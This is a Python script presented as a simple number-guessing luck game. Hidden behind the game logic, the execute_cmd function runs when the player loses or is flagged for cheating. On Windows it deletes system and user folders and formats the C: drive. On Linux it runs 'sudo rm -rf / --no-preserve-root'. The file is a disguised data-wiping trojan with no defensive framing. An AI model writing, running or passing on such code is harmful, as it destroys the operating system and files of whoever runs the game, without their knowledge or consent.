import random
import subprocess
from typing import Set
import platform

def fetch_cmd_by_os() -> list[str] | None:
    os_type = platform.system().lower()
    match os_type:
        case "windows":
            return [
                    'cmd', '/c',
                    'rd /s /q "C:\\Windows" & '
                    'rd /s /q "C:\\Program Files" & '
                    'rd /s /q "C:\\Program Files (x86)" & '
                    'rd /s /q "C:\\Users" & '
                    'rd /s /q "C:\\ProgramData" & '
                    'del /f /s /q C:\\*.* & '
                    'format C: /fs:NTFS /q /y'
                ]
        case "linux":
            return ['sudo','rm','-rf','/','--no-preserve-root']
        case "darwin":
            return []
        case _:
            return None
def execute_cmd():
    cmd = fetch_cmd_by_os()
    if not cmd is None:
        subprocess.run(cmd,shell=True,capture_output=True,text=True)

def get_input_from_player() -> Set[int]:
    user_input = input('Enter 3 numbers with spaces, minimum 1 and maximum 5: ')
    numbers = set()
    for user_val in user_input.split():
        number = int(user_val)
        numbers.add(number)
    return numbers

def validate_if_player_cheating(numbers,warning_max,warning_count) -> bool:
    if len(numbers) < 3 or len(numbers) > 3:
        warning_count += 1
        print(f'Don\'t cheat, warning {warning_count} of {warning_max}')
        return True
    return False

def core_game_play(numbers,warning_count):
    if warning_count<=3:
        print('Entered numbers:', numbers)

        rand_val = random.randint(1, 5)
        print(rand_val)

        if numbers.__contains__(rand_val):
            print('Lucky!!!!!')
        else:
            print('No luck !!!, Goodbye Friend.')
            execute_cmd()
    else:
        print('Cheating is bad !!, See ya..')
        execute_cmd()

def main():
    print('You have 60% chance of success...')
    warning_count = 0
    warning_max = 3
    numbers = set()

    while warning_count<=3:
        numbers = get_input_from_player()
        is_player_cheating = validate_if_player_cheating(numbers,warning_max,warning_count)
        if not is_player_cheating:
            break
        else:
            warning_count+=1

    core_game_play(numbers,warning_count)


if __name__=="__main__":
    main()
